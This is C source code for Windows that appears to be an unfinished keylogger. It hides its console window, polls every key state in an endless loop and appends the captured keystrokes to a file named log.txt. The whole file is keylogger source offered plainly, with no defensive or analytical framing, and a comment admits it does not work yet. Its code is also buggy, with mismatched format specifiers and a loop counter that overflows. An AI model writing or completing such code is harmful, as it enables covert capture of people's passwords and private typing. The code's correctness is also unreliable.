// Obviously doesn't work, yet.

#include <windows.h>
#include <stdio.h>

int Save(int _key, char *file);
int SaveInt(int number, char *file);

int main(void){
    printf("%s\n", "Start of log");
    int back = 47;
    printf("%d",'/');
    printf("%s",&back);

    FreeConsole();

    char i;
    printf("%s\n","INIT");
    while(1==1){
        Sleep(10);
        for(i = 8; i<255;i++) {
            printf("%d",i);
            SaveInt(GetAsyncKeyState(i),"log.txt");
            if(GetAsyncKeyState(i) == -32767){
                Save(i, "log.txt");
            }
        }
    }
    return 0;
}

int Save(int _key, char *file) {
    printf("%d\n",_key);
    Sleep(10);
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");
    switch(_key)
    {
        case VK_SHIFT: fprintf(OUTPUT_FILE, "[SHIFT]");
            break;
        case VK_BACK: fprintf(OUTPUT_FILE, "[BACKSPACE]");
            break;
        case VK_LBUTTON: fprintf(OUTPUT_FILE, "[LBUTTON]");
            break;
        case VK_RBUTTON: fprintf(OUTPUT_FILE, "[RBUTTON]");
            break;
        case VK_RETURN: fprintf(OUTPUT_FILE, "[ENTER]");
            break;
        case VK_TAB: fprintf(OUTPUT_FILE, "[TAB]");
            break;
        case VK_ESCAPE: fprintf(OUTPUT_FILE, "[ESCAPE]");
            break;
        case VK_CONTROL: fprintf(OUTPUT_FILE, "[Ctrl]");
            break;
        case VK_MENU: fprintf(OUTPUT_FILE, "[Alt]");
            break;
        case VK_CAPITAL: fprintf(OUTPUT_FILE, "[CAPS Lock]");
            break;
        case VK_SPACE: fprintf(OUTPUT_FILE, "[SPACE]");
            break;
    }
    fprintf(OUTPUT_FILE, "%s", &_key);
    fclose(OUTPUT_FILE);
    return 0;
}

int SaveInt(int number, char *file) {
    Sleep(10);
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");

    while(number > 0){
        int newVal = 48+(number % 10);
        fprintf(OUTPUT_FILE, "%s", &newVal);
        number /= 10;
    }

    fclose(OUTPUT_FILE);
    return 0;
}

